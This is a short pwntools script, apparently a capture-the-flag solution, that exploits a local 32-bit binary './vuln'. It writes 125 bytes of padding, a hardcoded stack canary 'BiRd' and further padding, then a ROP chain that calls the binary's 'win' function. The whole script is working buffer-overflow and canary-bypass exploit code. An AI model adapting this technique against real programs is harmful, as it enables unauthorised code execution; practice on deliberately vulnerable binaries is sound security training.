from pwn import *
context.clear(arch='i386')
elf = ELF('./vuln')

canary = 'BiRd'
rop = ROP(elf)
rop.raw("A" * 125 + canary + "A" * 16)
rop.call(elf.sym.win)
rop.exit(0)
p = process('./vuln')
p.recvuntil(b"How Many Bytes will You Write Into the Buffer?\n")
p.send(str(len(rop.chain())).encode())
p.send(rop.chain())
p.interactive()
